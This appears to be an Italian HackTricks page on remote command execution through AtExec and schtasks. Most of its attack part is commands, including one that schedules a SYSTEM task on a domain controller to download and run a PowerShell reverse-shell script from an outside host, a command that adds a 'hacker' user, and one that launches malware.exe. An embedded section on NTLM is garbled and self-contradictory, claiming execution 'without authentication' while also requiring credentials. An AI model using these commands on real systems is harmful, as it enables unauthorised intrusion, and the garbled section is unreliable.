# AtExec / SchtasksExec

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Come funziona

At consente di pianificare attività in host in cui si conosce il nome utente/(password/Hash). Quindi, puoi usarlo per eseguire comandi in altri host e ottenere l'output.
```
At \\victim 11:00:00PM shutdown -r
```
Per utilizzare schtasks, è necessario prima creare il task e poi chiamarlo:

{% code overflow="wrap" %}
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```
## Esecuzione remota di comandi tramite NTLM

L'esecuzione remota di comandi tramite NTLM è una tecnica che sfrutta le debolezze del protocollo NTLM per eseguire comandi su un sistema remoto senza autenticazione. Questa tecnica può essere utilizzata durante un test di penetrazione per ottenere l'accesso a un sistema remoto e sfruttare le sue vulnerabilità.

### Requisiti

Per utilizzare questa tecnica, è necessario soddisfare i seguenti requisiti:

- Avere accesso a un sistema remoto che utilizza l'autenticazione NTLM.
- Avere le credenziali di accesso a un account utente valido sul sistema remoto.

### Passaggi

Ecco i passaggi per eseguire l'esecuzione remota di comandi tramite NTLM:

1. Identificare un sistema remoto che utilizza l'autenticazione NTLM.
2. Ottenere le credenziali di accesso a un account utente valido sul sistema remoto.
3. Utilizzare un tool come `atexec` per eseguire comandi sul sistema remoto senza autenticazione.
4. Utilizzare i comandi eseguiti per ottenere l'accesso al sistema remoto e sfruttare le sue vulnerabilità.

### Esempio

Ecco un esempio di come utilizzare `atexec` per eseguire comandi su un sistema remoto tramite NTLM:

```
atexec -c "net user hacker password123 /add" -s <indirizzo_ip_sistema_remoto>
```

In questo esempio, il comando `net user hacker password123 /add` viene eseguito sul sistema remoto per creare un nuovo utente chiamato "hacker" con la password "password123".

### Contromisure

Per proteggersi dall'esecuzione remota di comandi tramite NTLM, è possibile adottare le seguenti contromisure:

- Utilizzare l'autenticazione NTLMv2 invece di NTLM.
- Impostare una password complessa per gli account utente.
- Limitare l'accesso ai sistemi remoti solo agli utenti autorizzati.
- Monitorare attentamente l'attività di rete per individuare eventuali tentativi di esecuzione remota di comandi non autorizzati.

{% endcode %}

{% code overflow="wrap" %}
```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Puoi anche utilizzare [SharpLateral](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
{% endcode %}

Ulteriori informazioni sull'**uso di schtasks con silver tickets qui**.

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
